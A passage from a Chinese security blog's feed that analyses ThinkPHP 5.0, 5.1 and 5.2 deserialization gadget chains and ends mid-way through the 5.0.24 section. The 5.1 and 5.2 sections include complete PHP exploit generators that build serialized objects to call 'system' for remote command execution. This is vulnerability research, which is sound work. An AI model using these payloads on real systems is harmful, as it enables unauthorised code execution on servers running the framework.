title="修复建议"></a>修复建议</h1><p>建议该处对于数据的输入进行全局的过滤，对于需要使用<code>sql</code>语句的地方，每个参数做好严格的检查，也可以采用预编译的方式来执行<code>sql</code>语句。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;查看cnvd时发现了该cms一个较新的漏洞，决定分析一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/05/06/zzzcmsV1-7-5
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp反序列化漏洞分析</title>
    <link href="https://yml-sec.top/2020/03/06/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2020/03/06/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-03-06T02:49:17.000Z</published>
    <updated>2020-03-11T14:26:49.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="5-1-x"><a href="#5-1-x" class="headerlink" title="5.1.x"></a>5.1.x</h1><blockquote><p>测试环境</p><p>tp5.1.35</p><p>php7.0.9</p></blockquote><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>框架最后触发执行任意命令的利用点在<code>/thinkphp/library/think/Request.php</code>中的<code>filterValue</code>函数，该函数中存在<code>call_user_func($filter, $value);</code>，通过反序列化我们最终可以实现对<code>$filter, $value</code>两个变量的控制，进而执行任意命令</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/1.png" alt="1"></p><p>从头跟一下利用链</p><p>起始触发点在<code>thinkphp/library/think/process/pipes/Windows.php</code>中<code>Windows</code>类的<code>__destruct</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/2.png" alt="2"></p><p><code>close</code>方法这里用不到，我们跟进一下<code>removeFiles</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/3.png" alt="3"></p><p>该方法中调用了<code>file_exists</code>函数，通过这个函数我们可以将<code>$filename</code>赋值成一个对象，这样在调用<code>file_exists</code>函数时就会触发实例化类的<code>__toString</code>方法，这样可以全局搜索<code>__toString</code>方法来寻找利用点，这里使用到了<code>thinkphp\library\think\model\concern\Conversion.php</code>中的<code>__toString</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/4.png" alt="4"></p><p>该方法中调用了<code>toJson</code>方法，跟进一下</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/5.png" alt="5"></p><p>继续跟进<code>toArray</code>方法，该方法中存在这样一段代码</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/6.png" alt="6"></p><p>在这里我们期望来找到形如<code>$可控变量-&gt;方法(可控参数)</code>这样的调用模式，这样就可以使我们跳到其他类调用其他类的方法，即使方法不可控，我们也可以调用其他类的<code>__call</code>方法进而继续寻找利用链，这里注意到了<code>$relation-&gt;visible($name);</code>这行代码，在这里<code>$name</code>是由<code>$this-&gt;append</code>来决定的，可以知道该变量是可控的，接着来看<code>$relation</code>，首先来看<code>$relation = $this-&gt;getRelation($key);</code>中的<code>getRelation</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/7.png" alt="7"></p><p>该处返回值为<code>NULL</code>，接着进入到<code>$relation = $this-&gt;getAttr($key);</code>，跟进<code>getAttr</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/8.png" alt="8"></p><p>该方法返回值为<code>$value</code>，因此接着跟进<code>getData</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/9.png" alt="9"></p><p>该处返回值为<code>$this-&gt;data[$name]</code>，其中<code>$name</code>取决于<code>$this-&gt;data</code>，这里<code>$this-&gt;data</code>是可控的，那么也就意味着<code>$relation</code>是可控的，那么该处<code>$relation-&gt;visible($name);</code>的模式为<code>$可控变量-&gt;不可控方法(可控参数)</code>，该处的条件可以使我们调用任意不存在<code>visible</code>方法的类的<code>__call</code>方法，接着来全局搜索<code>__call</code>方法，在这里我们利用到了<code>thinkphp/library/think/Request.php</code>中的<code>__call</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/10.png" alt="10"></p><p>该方法中存在<code>call_user_func_array</code>函数，其中第一个参数我们可以控制，第二个参数由于上面<code>array_unshift</code>函数的原因，其数组中第一个值固定为当前的类对象，这种情况下我们无法去直接在此处执行任意命令，因此我们需要利用此处继续寻找利用点，在Request类中可以发现有如下方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/11.png" alt="11"></p><p>该方法中存在着<code>call_user_func</code>这个函数，如果想办法来控制这个函数的两个参数就可以执行任意命令，我们需要来寻找一下何处调用了<code>filterValue</code>方法，这里我们选择同类下的input方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/14.png" alt="14"></p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/13.png" alt="13"></p><p>该方法中使用<code>array_walk_recursive</code>函数来调用了<code>filterValue</code>方法，在这里<code>$data</code>决定着<code>filterValue</code>的前两个参数，我们目前无法控制，<code>$filter</code>决定着第三个参数，它来源于该行代码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="variable">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br></pre></td></tr></table></figure><p>跟进<code>getFilter</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/15.png" alt="15"></p><p>可以看到<code>$filter</code>最终由<code>$this-&gt;filter</code>决定，是可控的，接着为了控制<code>$data</code>的值，我们需要继续寻找调用<code>input</code>方法的方法，这里使用了param方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/16.png" alt="16"></p><p>函数返回值处调用了<code>input</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/17.png" alt="17"></p><p>该处<code>$this-&gt;param</code>可控，其值为<code>$_GET</code>的值，我们在访问时加上参数即可控制，但该处$name是不可控的，因此在这里需要继续寻找调用<code>param</code>方法的方法，在此使用了<code>isAjax</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/18.png" alt="18"></p><p>该处<code>$this-&gt;config[&#39;var_ajax&#39;]</code>是可控的，那么<code>param</code>方法的<code>$name</code>就是可控的，因此input方法中的$name就可控了，这里就可以绕过该处代码使其不受<code>$data = $this-&gt;getData($data, $name);</code>的影响</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/19.png" alt="19"></p><p>目前我们可以控制<code>$data</code>和<code>$filter</code>，这也就意味着我们可以执行命令了</p><p>最后梳理下链的流程</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">反序列化触发</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Windows)-&gt;__destruct</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Windows)-&gt;removeFiles</span><br><span class="line">|</span><br><span class="line">(trait <span class="keyword">Conversion</span>)-&gt;__toString</span><br><span class="line">|</span><br><span class="line">(trait <span class="keyword">Conversion</span>)-&gt;toJson</span><br><span class="line">|</span><br><span class="line">(trait <span class="keyword">Conversion</span>)-&gt;toArray</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;__call</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;isAjax</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;param</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;<span class="keyword">input</span></span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;filterValue-&gt;call_user_func()</span><br></pre></td></tr></table></figure><h2 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h2><p>理清楚链的流程后对于<code>payload</code>的编写相对来说容易一些，其中在利用的过程中使用到<code>trait Conversion</code>与<code>trait Attribute</code>，他们是不能被实例化的，所以我们需要找到引用了这两个<code>trait</code>的类来进行实例化，这里使用了<code>thinkphp/library/think/Model.php</code>中的<code>Model</code>类</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/20.png" alt="20"></p><p>该类的类型为<code>abstract</code>，是一个抽象类，也是无法实例化的，这里还要继续寻找<code>Model</code>类的子类，搜索发现到<code>thinkphp/library/think/model/Pivot.php</code>中的<code>Pivot</code>类，因此<code>exp</code>编写如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Cookie</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $config = [];</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $data = [];</span><br><span class="line"><span class="keyword">protected</span> $append = [];</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;append=[<span class="string">'a'</span>=&gt;[<span class="string">'b'</span>=&gt;<span class="string">'c'</span>]];</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [<span class="string">'a'</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Process</span>;</span><br><span class="line"><span class="comment">//use think\model\concern\Conversion;</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files = [];</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>利用截图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/21.png" alt="21"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://xz.aliyun.com/t/6467" target="_blank" rel="noopener">https://xz.aliyun.com/t/6467</a></p><p><a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></p></blockquote><h1 id="5-2-x"><a href="#5-2-x" class="headerlink" title="5.2.x"></a>5.2.x</h1><blockquote><p>测试环境</p><p>tp5.2.0</p><p>php7.3.4</p></blockquote><h2 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h2><p><code>5.2.0</code>版本的链在前半部分与<code>5.1</code>版本相同，通过<code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code>中的<code>windows</code>类的<code>__destruct</code>方法触发，接着通过removeFiles方法触发<code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code>中<code>Conversion</code>的<code>__toString</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/22.png" alt="22"></p><p>跟进<code>toJson</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/23.png" alt="23"></p><p>继续跟进<code>toArray</code>方法，需要关注下面的代码段</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/24.png" alt="24"></p><p>跟进这个<code>getAttr</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/25.png" alt="25"></p><p>它的返回值是另一个方法的返回值，跟进这个方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/26.png" alt="26"></p><p>在该方法中存在着<code>$value   = $closure($value, $this-&gt;data);</code>这样一处动态调用，我们可以探究一下<code>$closure</code>，<code>$value</code>，<code>$this-&gt;data</code>这三处是否可控，其中<code>$this-&gt;data</code>是直接可控的</p><p>那么来看<code>$closure</code>，其值由<code>$this-&gt;withAttr[$fieldName];</code>决定的，其中<code>$this-&gt;withAttr</code>是可控的，现在需要知道<code>$fieldName</code>是否可控，<code>$fieldName</code>的值由<code>$this-&gt;getRealFieldName($name);</code>决定，跟进<code>getRealFieldName</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/27.png" alt="27"></p><p>这里的<code>$this-&gt;strict</code>默认值为<code>true</code>，那么该函数的返回值为<code>$name</code>，该变量是<code>getValue</code>方法的第一个参数，也就是<code>getAttr</code>方法的参数，如下图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/28.png" alt="28"></p><p>在<code>toArray</code>方法中，该参数为<code>$data</code>的一个键值，如图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/29.png" alt="29"></p><p>在这里可以看到<code>$data</code>是可控的，那么意味着<code>$closure</code>是可控的</p><p>接着看一下<code>$value</code>，在<code>getValue</code>方法中，<code>$relation</code>为<code>flase</code>，所以这里的<code>$value</code>是当作参数传进来的，如图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/30.png" alt="30"></p><p>向前面找可以看到<code>$value</code>是<code>getData</code>方法的返回值，如图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/31.png" alt="31"></p><p>跟进该方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/32.png" alt="32"></p><p>该处<code>$fieldName</code>, <code>$this-&gt;data</code>都是可控的，这意味着<code>$value</code>是可控的，在这里<code>$closure($value, $this-&gt;data);</code>就完全可控了，我们可以构造如下的动态调用来执行系统命令</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/33.png" alt="33"></p><h2 id="payload编写-1"><a href="#payload编写-1" class="headerlink" title="payload编写"></a>payload编写</h2><p>有了上面的分析流程，结合分析5.1的经验，很容易编写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="keyword">private</span> $relation = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;relation = [<span class="string">'yemoli'</span>=&gt;<span class="string">'whoami'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">'yemoli'</span>=&gt;<span class="string">'system'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://xz.aliyun.com/t/6476" target="_blank" rel="noopener">https://xz.aliyun.com/t/6476</a></p></blockquote><h1 id="5-0-24"><a href="#5-0-24" class="headerlink" title="5.0.24"></a>5.0.24</h1><blockquote><p>测试环境</p><p>Linux</p><p>php5.6</p><p>tp5.0.24</p></blockquote><h2 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h2><p>该版本下利用方式是通过反序列化达到写文件的目的，我们来跟一下链</p><p>开始位置同样是位于<code>thinkphp/library/think/process/pipes/Windows.php</code>中的<code>windows</code>类的<code>__destruct</code>方法，该方法调用<code>removeFiles</code>方法，利用<code>removeFiles</code>可以实现对任意类<code>__toString</code>方法的触发，这里选择触发位于<code>thinkphp/library/think/Model.php</code>中的<code>Model</code>类的<code>__toString</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>toJson</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>toArray</code>，列出关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $item    = [];</span><br><span class="line">    $visible = [];</span><br><span class="line">    $hidden  = [];</span><br><span class="line"></span><br><span class="line">    $data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">                <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                $relation   = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                $item[$key] = $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (strpos($name, <span class="string">'.'</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $attr) = explode(<span class="string">'.'</span>, $name);</span><br><span class="line">                <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                $relation   = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $relation = Loader::parseName($name, <span class="number">1</span>, <span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, $relation)) &#123;</span><br><span class="line">                        $modelRelation = <span class="keyword">$this</span>-&gt;$relation();</span><br><span class="line">                        $value         = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (method_exists($modelRelation, <span class="string">'getBindAttr'</span>)) &#123;</span><br><span class="line">                        $bindAttr = $modelRelation-&gt;getBindAttr();</span><br><span class="line">                        <span class="keyword">if</span> ($bindAttr) &#123;</span><br><span class="line">                            <span class="keyword">foreach</span> ($bindAttr <span class="keyword">as</span> $key =&gt; $attr) &#123;</span><br><span class="line">                                $key = is_numeric($key) ? $attr : $key;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$key])) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'bind attr has exists:'</span> . $key);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    $item[$key] = $value ? $value-&gt;getAttr($attr) : <span class="keyword">null</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $item[$name] = $value;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $item[$name] = <span class="keyword">$this</span>-&gt;getAttr($name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>($item) ? $item : [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的目的是到达如下代码段</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/34.png" alt="34"></p><p>我在该函数中对于<code>__call</code>方法的触发不同于参考文章，直接跟进<code>getRelationData</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span><span class="params">(Relation $modelRelation)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;fuction called"</span>;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取关联数据</span></span><br><span class="line">            <span class="keyword">if</span> (method_exists($modelRelation, <span class="string">'getRelation'</span>)) &#123;</span><br><span class="line">                $value = $modelRelation-&gt;getRelation();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span 